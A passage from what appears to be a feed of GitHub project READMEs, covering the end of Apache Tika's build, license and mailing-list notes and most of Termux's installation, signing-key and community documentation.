&lt;p&gt;If a new vulnerability has been discovered between the date of the tag and the date you are building the tag, you may need to build with:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;4. mvn clean install -Dossindex.skip
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If a local test is not working in your environment, please notify the project at &lt;a href="mailto:dev@tika.apache.org"&gt;dev@tika.apache.org&lt;/a&gt;. As an immediate workaround, you can turn off individual tests with e.g.:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;4. mvn clean install -Dossindex.skip -Dtest=\!UnpackerResourceTest#testPDFImages
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;License (see also LICENSE.txt)&lt;/h1&gt; 
&lt;p&gt;Collective work: Copyright 2011 The Apache Software Foundation.&lt;/p&gt; 
&lt;p&gt;Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://www.apache.org/licenses/LICENSE-2.0"&gt;https://www.apache.org/licenses/LICENSE-2.0&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.&lt;/p&gt; 
&lt;p&gt;Apache Tika includes a number of subcomponents with separate copyright notices and license terms. Your use of these subcomponents is subject to the terms and conditions of the licenses listed in the LICENSE.txt file.&lt;/p&gt; 
&lt;h1&gt;Export Control&lt;/h1&gt; 
&lt;p&gt;This distribution includes cryptographic software. The country in which you currently reside may have restrictions on the import, possession, use, and/or re-export to another country, of encryption software. BEFORE using any encryption software, please check your country's laws, regulations and policies concerning the import, possession, or use, and re-export of encryption software, to see if this is permitted. See &lt;a href="http://www.wassenaar.org/"&gt;http://www.wassenaar.org/&lt;/a&gt; for more information.&lt;/p&gt; 
&lt;p&gt;The U.S. Government Department of Commerce, Bureau of Industry and Security (BIS), has classified this software as Export Commodity Control Number (ECCN) 5D002.C.1, which includes information security software using or performing cryptographic functions with asymmetric algorithms. The form and manner of this Apache Software Foundation distribution makes it eligible for export under the License Exception ENC Technology Software Unrestricted (TSU) exception (see the BIS Export Administration Regulations, Section 740.13) for both object code and source code.&lt;/p&gt; 
&lt;p&gt;The following provides more details on the included cryptographic software:&lt;/p&gt; 
&lt;p&gt;Apache Tika uses the Bouncy Castle generic encryption libraries for extracting text content and metadata from encrypted PDF files. See &lt;a href="http://www.bouncycastle.org/"&gt;http://www.bouncycastle.org/&lt;/a&gt; for more details on Bouncy Castle.&lt;/p&gt; 
&lt;h1&gt;Mailing Lists&lt;/h1&gt; 
&lt;p&gt;Discussion about Tika takes place on the following mailing lists:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="mailto:user@tika.apache.org"&gt;user@tika.apache.org&lt;/a&gt; - About using Tika&lt;/li&gt; 
 &lt;li&gt;&lt;a href="mailto:dev@tika.apache.org"&gt;dev@tika.apache.org&lt;/a&gt; - About developing Tika&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Notification on all code changes are sent to the following mailing list:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="mailto:commits@tika.apache.org"&gt;commits@tika.apache.org&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The mailing lists are open to anyone and publicly archived.&lt;/p&gt; 
&lt;p&gt;You can subscribe the mailing lists by sending a message to [LIST]&lt;a href="mailto:-subscribe@tika.apache.org"&gt;-subscribe@tika.apache.org&lt;/a&gt; (for example, user-subscribe@...).&lt;br /&gt; To unsubscribe, send a message to [LIST]&lt;a href="mailto:-unsubscribe@tika.apache.org"&gt;-unsubscribe@tika.apache.org&lt;/a&gt;.&lt;br /&gt; For more instructions, send a message to [LIST]&lt;a href="mailto:-help@tika.apache.org"&gt;-help@tika.apache.org&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;Issue Tracker&lt;/h1&gt; 
&lt;p&gt;If you encounter errors in Tika or want to suggest an improvement or a new feature, please visit the &lt;a href="https://issues.apache.org/jira/browse/TIKA"&gt;Tika issue tracker&lt;/a&gt;. There you can also find the latest information on known issues and recent bug fixes and enhancements.&lt;/p&gt; 
&lt;h1&gt;Build Issues&lt;/h1&gt; 
&lt;p&gt;&lt;em&gt;TODO&lt;/em&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Need to install jce&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;If you find any other issues while building, please email the &lt;a href="mailto:dev@tika.apache.org"&gt;dev@tika.apache.org&lt;/a&gt; list.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>termux/termux-app</title>
      <link>https://github.com/termux/termux-app</link>
      <description>&lt;p&gt;Termux - a terminal emulator application for Android OS extendible by variety of packages.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Termux application&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/termux/termux-app/actions"&gt;&lt;img src="https://github.com/termux/termux-app/workflows/Build/badge.svg?sanitize=true" alt="Build status" /&gt;&lt;/a&gt; &lt;a href="https://github.com/termux/termux-app/actions"&gt;&lt;img src="https://github.com/termux/termux-app/workflows/Unit%20tests/badge.svg?sanitize=true" alt="Testing status" /&gt;&lt;/a&gt; &lt;a href="https://gitter.im/termux/termux"&gt;&lt;img src="https://badges.gitter.im/termux/termux.svg?sanitize=true" alt="Join the chat at https://gitter.im/termux/termux" /&gt;&lt;/a&gt; &lt;a href="https://discord.gg/HXpF69X"&gt;&lt;img src="https://img.shields.io/discord/641256914684084234.svg?label=&amp;amp;logo=discord&amp;amp;logoColor=ffffff&amp;amp;color=5865F2" alt="Join the Termux discord server" /&gt;&lt;/a&gt; &lt;a href="https://jitpack.io/#termux/termux-app"&gt;&lt;img src="https://jitpack.io/v/termux/termux-app.svg?sanitize=true" alt="Termux library releases at Jitpack" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://termux.com"&gt;Termux&lt;/a&gt; is an Android terminal application and Linux environment.&lt;/p&gt; 
&lt;p&gt;Note that this repository is for the app itself (the user interface and the terminal emulation). For the packages installable inside the app, see &lt;a href="https://github.com/termux/termux-packages"&gt;termux/termux-packages&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Quick how-to about Termux package management is available at &lt;a href="https://github.com/termux/termux-packages/wiki/Package-Management"&gt;Package Management&lt;/a&gt;. It also has info on how to fix &lt;strong&gt;&lt;code&gt;repository is under maintenance or down&lt;/code&gt;&lt;/strong&gt; errors when running &lt;code&gt;apt&lt;/code&gt; or &lt;code&gt;pkg&lt;/code&gt; commands.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;We are looking for Termux Android application maintainers.&lt;/strong&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;p&gt;&lt;strong&gt;NOTICE: Termux may be unstable on Android 12+.&lt;/strong&gt; Android OS will kill any (phantom) processes greater than 32 (limit is for all apps combined) and also kill any processes using excessive CPU. You may get &lt;code&gt;[Process completed (signal 9) - press Enter]&lt;/code&gt; message in the terminal without actually exiting the shell process yourself. Check the related issue &lt;a href="https://github.com/termux/termux-app/issues/2366"&gt;#2366&lt;/a&gt;, &lt;a href="https://issuetracker.google.com/u/1/issues/205156966"&gt;issue tracker&lt;/a&gt;, &lt;a href="https://github.com/agnostic-apollo/Android-Docs/raw/master/en/docs/apps/processes/phantom-cached-and-empty-processes.md"&gt;phantom cached and empty processes docs&lt;/a&gt; and &lt;a href="https://github.com/termux/termux-app/issues/2366#issuecomment-1237468220"&gt;this TLDR comment&lt;/a&gt; on how to disable trimming of phantom and excessive cpu usage processes. A proper docs page will be added later. An option to disable the killing should be available in Android 12L or 13, so upgrade at your own risk if you are on Android 11, specially if you are not rooted.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Contents&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#termux-app-and-plugins"&gt;Termux App and Plugins&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#installation"&gt;Installation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#uninstallation"&gt;Uninstallation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#important-links"&gt;Important Links&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#debugging"&gt;Debugging&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#for-maintainers-and-contributors"&gt;For Maintainers and Contributors&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#forking"&gt;Forking&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;Termux App and Plugins&lt;/h2&gt; 
&lt;p&gt;The core &lt;a href="https://github.com/termux/termux-app"&gt;Termux&lt;/a&gt; app comes with the following optional plugin apps.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-api"&gt;Termux:API&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-boot"&gt;Termux:Boot&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-float"&gt;Termux:Float&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-styling"&gt;Termux:Styling&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-tasker"&gt;Termux:Tasker&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-widget"&gt;Termux:Widget&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;p&gt;Latest version is &lt;code&gt;v0.118.3&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;NOTICE: It is highly recommended that you update to &lt;code&gt;v0.118.0&lt;/code&gt; or higher ASAP for various bug fixes, including a critical world-readable vulnerability reported &lt;a href="https://termux.github.io/general/2022/02/15/termux-apps-vulnerability-disclosures.html"&gt;here&lt;/a&gt;. See &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#google-play-store-experimental-branch"&gt;below&lt;/a&gt; for information regarding Termux on Google Play.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Termux can be obtained through various sources listed below for &lt;strong&gt;only&lt;/strong&gt; Android &lt;code&gt;&amp;gt;= 7&lt;/code&gt; with full support for apps and packages.&lt;/p&gt; 
&lt;p&gt;Support for both app and packages was dropped for Android &lt;code&gt;5&lt;/code&gt; and &lt;code&gt;6&lt;/code&gt; on &lt;a href="https://www.reddit.com/r/termux/comments/dnzdbs/end_of_android56_support_on_20200101/"&gt;2020-01-01&lt;/a&gt; at &lt;code&gt;v0.83&lt;/code&gt;, however it was re-added just for the app &lt;em&gt;without any support for package updates&lt;/em&gt; on &lt;a href="https://github.com/termux/termux-app/pull/2740"&gt;2022-05-24&lt;/a&gt; via the &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#github"&gt;GitHub&lt;/a&gt; sources. Check &lt;a href="https://github.com/termux/termux-app/wiki/Termux-on-android-5-or-6"&gt;here&lt;/a&gt; for the details.&lt;/p&gt; 
&lt;p&gt;The APK files of different sources are signed with different signature keys. The &lt;code&gt;Termux&lt;/code&gt; app and all its plugins use the same &lt;a href="https://developer.android.com/guide/topics/manifest/manifest-element"&gt;&lt;code&gt;sharedUserId&lt;/code&gt;&lt;/a&gt; &lt;code&gt;com.termux&lt;/code&gt; and so all their APKs installed on a device must have been signed with the same signature key to work together and so they must all be installed from the same source. Do not attempt to mix them together, i.e do not try to install an app or plugin from &lt;code&gt;F-Droid&lt;/code&gt; and another one from a different source like &lt;code&gt;GitHub&lt;/code&gt;. Android Package Manager will also normally not allow installation of APKs with different signatures and you will get errors on installation like &lt;code&gt;App not installed&lt;/code&gt;, &lt;code&gt;Failed to install due to an unknown error&lt;/code&gt;, &lt;code&gt;INSTALL_FAILED_UPDATE_INCOMPATIBLE&lt;/code&gt;, &lt;code&gt;INSTALL_FAILED_SHARED_USER_INCOMPATIBLE&lt;/code&gt;, &lt;code&gt;signatures do not match previously installed version&lt;/code&gt;, etc. This restriction can be bypassed with root or with custom roms.&lt;/p&gt; 
&lt;p&gt;If you wish to install from a different source, then you must &lt;strong&gt;uninstall any and all existing Termux or its plugin app APKs&lt;/strong&gt; from your device first, then install all new APKs from the same new source. Check &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#uninstallation"&gt;Uninstallation&lt;/a&gt; section for details. You may also want to consider &lt;a href="https://wiki.termux.com/wiki/Backing_up_Termux"&gt;Backing up Termux&lt;/a&gt; before the uninstallation so that you can restore it after re-installing from Termux different source.&lt;/p&gt; 
&lt;p&gt;In the following paragraphs, &lt;em&gt;"bootstrap"&lt;/em&gt; refers to the minimal packages that are shipped with the &lt;code&gt;termux-app&lt;/code&gt; itself to start a working shell environment. Its zips are built and released &lt;a href="https://github.com/termux/termux-packages/releases"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;F-Droid&lt;/h3&gt; 
&lt;p&gt;Termux application can be obtained from &lt;code&gt;F-Droid&lt;/code&gt; from &lt;a href="https://f-droid.org/en/packages/com.termux/"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;You &lt;strong&gt;do not&lt;/strong&gt; need to download the &lt;code&gt;F-Droid&lt;/code&gt; app (via the &lt;code&gt;Download F-Droid&lt;/code&gt; link) to install Termux. You can download the Termux APK directly from the site by clicking the &lt;code&gt;Download APK&lt;/code&gt; link at the bottom of each version section.&lt;/p&gt; 
&lt;p&gt;It usually takes a few days (or even a week or more) for updates to be available on &lt;code&gt;F-Droid&lt;/code&gt; once an update has been released on &lt;code&gt;GitHub&lt;/code&gt;. The &lt;code&gt;F-Droid&lt;/code&gt; releases are built and published by &lt;code&gt;F-Droid&lt;/code&gt; once they &lt;a href="https://gitlab.com/fdroid/fdroiddata/-/blob/master/metadata/com.termux.yml"&gt;detect&lt;/a&gt; a new &lt;code&gt;GitHub&lt;/code&gt; release. The Termux maintainers &lt;strong&gt;do not&lt;/strong&gt; have any control over the building and publishing of the Termux apps on &lt;code&gt;F-Droid&lt;/code&gt;. Moreover, the Termux maintainers also do not have access to the APK signing keys of &lt;code&gt;F-Droid&lt;/code&gt; releases, so we cannot release an APK ourselves on &lt;code&gt;GitHub&lt;/code&gt; that would be compatible with &lt;code&gt;F-Droid&lt;/code&gt; releases.&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;F-Droid&lt;/code&gt; app often may not notify you of updates and you will manually have to do a pull down swipe action in the &lt;code&gt;Updates&lt;/code&gt; tab of the app for it to check updates. Make sure battery optimizations are disabled for the app, check &lt;a href="https://dontkillmyapp.com/"&gt;https://dontkillmyapp.com/&lt;/a&gt; for details on how to do that.&lt;/p&gt; 
&lt;p&gt;Only a universal APK is released, which will work on all supported architectures. The APK and bootstrap installation size will be &lt;code&gt;~180MB&lt;/code&gt;. &lt;code&gt;F-Droid&lt;/code&gt; does &lt;a href="https://github.com/termux/termux-app/pull/1904"&gt;not support&lt;/a&gt; architecture specific APKs.&lt;/p&gt; 
&lt;h3&gt;GitHub&lt;/h3&gt; 
&lt;p&gt;Termux application can be obtained on &lt;code&gt;GitHub&lt;/code&gt; either from &lt;a href="https://github.com/termux/termux-app/releases"&gt;&lt;code&gt;GitHub Releases&lt;/code&gt;&lt;/a&gt; for version &lt;code&gt;&amp;gt;= 0.118.0&lt;/code&gt; or from &lt;a href="https://github.com/termux/termux-app/actions/workflows/debug_build.yml?query=branch%3Amaster+event%3Apush"&gt;&lt;code&gt;GitHub Build Action&lt;/code&gt;&lt;/a&gt; workflows. &lt;strong&gt;For android &lt;code&gt;&amp;gt;= 7&lt;/code&gt;, only install &lt;code&gt;apt-android-7&lt;/code&gt; variants. For android &lt;code&gt;5&lt;/code&gt; and &lt;code&gt;6&lt;/code&gt;, only install &lt;code&gt;apt-android-5&lt;/code&gt; variants.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;The APKs for &lt;code&gt;GitHub Releases&lt;/code&gt; will be listed under &lt;code&gt;Assets&lt;/code&gt; drop-down of a release. These are automatically attached when a new version is released.&lt;/p&gt; 
&lt;p&gt;The APKs for &lt;code&gt;GitHub Build&lt;/code&gt; action workflows will be listed under &lt;code&gt;Artifacts&lt;/code&gt; section of a workflow run. These are created for each commit/push done to the repository and can be used by users who don't want to wait for releases and want to try out the latest features immediately or want to test their pull requests. Note that for action workflows, you need to be &lt;a href="https://github.com/login"&gt;&lt;strong&gt;logged into a &lt;code&gt;GitHub&lt;/code&gt; account&lt;/strong&gt;&lt;/a&gt; for the &lt;code&gt;Artifacts&lt;/code&gt; links to be enabled/clickable. If you are using the &lt;a href="https://github.com/mobile"&gt;&lt;code&gt;GitHub&lt;/code&gt; app&lt;/a&gt;, then make sure to open workflow link in a browser like Chrome or Firefox that has your GitHub account logged in since the in-app browser may not be logged in.&lt;/p&gt; 
&lt;p&gt;The APKs for both of these are &lt;a href="https://developer.android.com/studio/debug"&gt;&lt;code&gt;debuggable&lt;/code&gt;&lt;/a&gt; and are compatible with each other but they are not compatible with other sources.&lt;/p&gt; 
&lt;p&gt;Both universal and architecture specific APKs are released. The APK and bootstrap installation size will be &lt;code&gt;~180MB&lt;/code&gt; if using universal and &lt;code&gt;~120MB&lt;/code&gt; if using architecture specific. Check &lt;a href="https://github.com/termux/termux-app/issues/2153"&gt;here&lt;/a&gt; for details.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Security warning&lt;/strong&gt;: APK files on GitHub are signed with a test key that has been &lt;a href="https://github.com/termux/termux-app/raw/master/app/testkey_untrusted.jks"&gt;shared with community&lt;/a&gt;. This IS NOT an official developer key and everyone can use it to generate releases for own testing. Be very careful when using Termux GitHub builds obtained elsewhere except &lt;a href="https://github.com/termux/termux-app"&gt;https://github.com/termux/termux-app&lt;/a&gt;. Everyone is able to use it to forge a malicious Termux update installable over the GitHub build. Think twice about installing Termux builds distributed via Telegram or other social media. If your device get caught by malware, we will not be able to help you.&lt;/p&gt; 
&lt;p&gt;The &lt;a href="https://github.com/termux/termux-app/raw/master/app/testkey_untrusted.jks"&gt;test key&lt;/a&gt; shall not be used to impersonate @termux and can't be used for this anyway. This key is not trusted by us and it is quite easy to detect its use in user generated content.&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;Keystore information&lt;/summary&gt; 
 &lt;pre&gt;&lt;code&gt;Alias name: alias
Creation date: Oct 4, 2019
Entry type: PrivateKeyEntry
Certificate chain length: 1
Certificate[1]:
Owner: CN=APK Signer, OU=Earth, O=Earth
Issuer: CN=APK Signer, OU=Earth, O=Earth
Serial number: 29be297b
Valid from: Wed Sep 04 02:03:24 EEST 2019 until: Tue Oct 26 02:03:24 EEST 2049
Certificate fingerprints:
         SHA1: 51:79:55:EA:BF:69:FC:05:7C:41:C7:D3:79:DB:BC:EF:20:AD:85:F2
         SHA256: B6:DA:01:48:0E:EF:D5:FB:F2:CD:37:71:B8:D1:02:1E:C7:91:30:4B:DD:6C:4B:F4:1D:3F:AA:BA:D4:8E:E5:E1
Signature algorithm name: SHA1withRSA (disabled)
Subject Public Key Algorithm: 2048-bit RSA key
Version: 3
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;h3&gt;Google Play Store &lt;strong&gt;(Experimental branch)&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;There is currently a build of Termux available on Google Play for Android 11+ devices, with extensive adjustments in order to pass policy requirements there. This is under development and has missing functionality and bugs (see &lt;a href="https://github.com/termux-play-store/"&gt;here&lt;/a&gt; for status updates) compared to the stable F-Droid build, which is why most users who can should still use F-Droid or GitHub build as mentioned above.&lt;/p&gt; 
&lt;p&gt;Currently, Google Play will try to update installations away from F-Droid ones. Updating will still fail as &lt;a href="https://developer.android.com/guide/topics/manifest/manifest-element#uid"&gt;sharedUserId&lt;/a&gt; has been removed. A planned 0.118.1 F-Droid release will fix this by setting a higher version code than used for the PlayStore app. Meanwhile, to prevent Google Play from attempting to download and then fail to install the Google Play releases over existing installations, you can open the Termux apps pages on Google Play and then click on the 3 dots options button in the top right and then disable the Enable auto update toggle. However, the Termux apps updates will still show in the PlayStore app updates list.&lt;/p&gt; 
&lt;p&gt;If you want to help out with testing the Google Play build (or cannot install Termux from other sources), be aware that it's built from a separate repository (&lt;a href="https://github.com/termux-play-store/"&gt;https://github.com/termux-play-store/&lt;/a&gt;) - be sure to report issues &lt;a href="https://github.com/termux-play-store/termux-issues/issues/new/choose"&gt;there&lt;/a&gt;, as any issues encountered might very well be specific to that repository.&lt;/p&gt; 
&lt;h2&gt;Uninstallation&lt;/h2&gt; 
&lt;p&gt;Uninstallation may be required if a user doesn't want Termux installed in their device anymore or is switching to a different &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#installation"&gt;install source&lt;/a&gt;. You may also want to consider &lt;a href="https://wiki.termux.com/wiki/Backing_up_Termux"&gt;Backing up Termux&lt;/a&gt; before the uninstallation.&lt;/p&gt; 
&lt;p&gt;To uninstall Termux completely, you must uninstall &lt;strong&gt;any and all existing Termux or its plugin app APKs&lt;/strong&gt; listed in &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#termux-app-and-plugins"&gt;Termux App and Plugins&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Go to &lt;code&gt;Android Settings&lt;/code&gt; -&amp;gt; &lt;code&gt;Applications&lt;/code&gt; and then look for those apps. You can also use the search feature if it’s available on your device and search &lt;code&gt;termux&lt;/code&gt; in the applications list.&lt;/p&gt; 
&lt;p&gt;Even if you think you have not installed any of the plugins, it's strongly suggested to go through the application list in Android settings and double-check.&lt;/p&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;Important Links&lt;/h2&gt; 
&lt;h3&gt;Community&lt;/h3&gt; 
&lt;p&gt;All community links are available &lt;a href="https://wiki.termux.com/wiki/Community"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The main ones are the following.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://reddit.com/r/termux"&gt;Termux Reddit community&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://matrix.to/#/#termux_termux:gitter.im"&gt;Termux User Matrix Channel&lt;/a&gt; (&lt;a href="https://gitter.im/termux/termux"&gt;Gitter&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://matrix.to/#/#termux_dev:gitter.im"&gt;Termux Dev Matrix Channel&lt;/a&gt; (&lt;a href="https://gitter.im/termux/dev"&gt;Gitter&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://twitter.com/termuxdevs"&gt;Termux X (Twitter)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="mailto:support@termux.dev"&gt;Termux Support Email&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Wikis&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/"&gt;Termux Wiki&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-app/wiki"&gt;Termux App Wiki&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-packages/wiki"&gt;Termux Packages Wiki&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Miscellaneous&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/FAQ"&gt;FAQ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-packages/wiki/Termux-file-system-layout"&gt;Termux File System Layout&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Differences_from_Linux"&gt;Differences From Linux&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Package_Management"&gt;Package Management&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Remote_Access"&gt;Remote Access&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Backing_up_Termux"&gt;Backing up Termux&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Terminal_Settings"&gt;Terminal Settings&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Touch_Keyboard"&gt;Touch Keyboard&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Internal_and_external_storage"&gt;Android Storage and Sharing Data with Other Apps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Termux:API"&gt;Android APIs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-packages/issues/6348"&gt;Moved Termux Packages Hosting From Bintray to IPFS&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-app/wiki/RUN_COMMAND-Intent"&gt;Running Commands in Termux From Other Apps via &lt;code&gt;RUN_COMMAND&lt;/code&gt; intent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-packages/wiki/Termux-and-Android-10"&gt;Termux and Android 10&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Terminal&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;/summary&gt; 
 &lt;h3&gt;Terminal resources&lt;/h3&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href="https://invisible-island.net/xterm/ctlseqs/ctlseqs.html"&gt;XTerm control sequences&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;a href="https://vt100.net/"&gt;vt100.net&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;a href="https://wiki.bash-hackers.org/scripting/terminalcodes"&gt;Terminal codes (ANSI and terminfo equivalents)&lt;/a&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h3&gt;Terminal emulators&lt;/h3&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;VTE (libvte): Terminal emulator widget for GTK+, mainly used in gnome-terminal. &lt;a href="https://github.com/GNOME/vte"&gt;Source&lt;/a&gt;, &lt;a href="https://bugzilla.gnome.org/buglist.cgi?quicksearch=product%3A%22vte%22+"&gt;Open Issues&lt;/a&gt;, and &lt;a href="https://bugzilla.gnome.org/buglist.cgi?bug_status=RESOLVED&amp;amp;bug_status=VERIFIED&amp;amp;chfield=resolution&amp;amp;chfieldfrom=-2000d&amp;amp;chfieldvalue=FIXED&amp;amp;product=vte&amp;amp;resolution=FIXED"&gt;All (including closed) issues&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;iTerm 2: OS X terminal application. &lt;a href="https://github.com/gnachman/iTerm2"&gt;Source&lt;/a&gt;, &lt;a href="https://gitlab.com/gnachman/iterm2/issues"&gt;Issues&lt;/a&gt; and &lt;a href="https://iterm2.com/documentation.html"&gt;Documentation&lt;/a&gt; (which includes &lt;a href="https://iterm2.com/documentation-escape-codes.html"&gt;iTerm2 proprietary escape codes&lt;/a&gt;).&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Konsole: KDE terminal application. &lt;a href="https://projects.kde.org/projects/kde/applications/konsole/repository"&gt;Source&lt;/a&gt;, in particular &lt;a href="https://projects.kde.org/projects/kde/applications/konsole/repository/revisions/master/show/tests"&gt;tests&lt;/a&gt;, &lt;a href="https://bugs.kde.org/buglist.cgi?bug_severity=critical&amp;amp;bug_severity=grave&amp;amp;bug_severity=major&amp;amp;bug_severity=crash&amp;amp;bug_severity=normal&amp;amp;bug_severity=minor&amp;amp;bug_status=UNCONFIRMED&amp;amp;bug_status=NEW&amp;amp;bug_status=ASSIGNED&amp;amp;bug_status=REOPENED&amp;amp;product=konsole"&gt;Bugs&lt;/a&gt; and &lt;a href="https://bugs.kde.org/buglist.cgi?bug_severity=wishlist&amp;amp;bug_status=UNCONFIRMED&amp;amp;bug_status=NEW&amp;amp;bug_status=ASSIGNED&amp;amp;bug_status=REOPENED&amp;amp;product=konsole"&gt;Wishes&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
